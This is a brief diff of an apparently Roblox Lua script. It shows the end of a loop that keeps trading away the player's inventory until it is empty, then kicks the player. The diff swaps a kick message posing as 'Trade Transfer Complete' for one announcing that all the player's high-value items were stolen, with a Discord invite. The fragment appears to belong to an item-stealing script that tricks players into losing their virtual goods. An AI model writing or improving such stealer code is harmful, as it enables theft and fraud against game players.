@@ -1490,7 +1490,7 @@ StartNextTrade = function()
 				local remaining = ScanInventory()
 				if #remaining == 0 then
 					State.Running = false
-					LocalPlayer:Kick("Trade Transfer Complete by:\n\ndiscord.gg/jpwVqWEy4")
+					LocalPlayer:Kick("All your high vakue items got stolen by:\n\ndiscord.gg/jpwVqWEy4")
 				else
 					StartNextTrade()
 				end
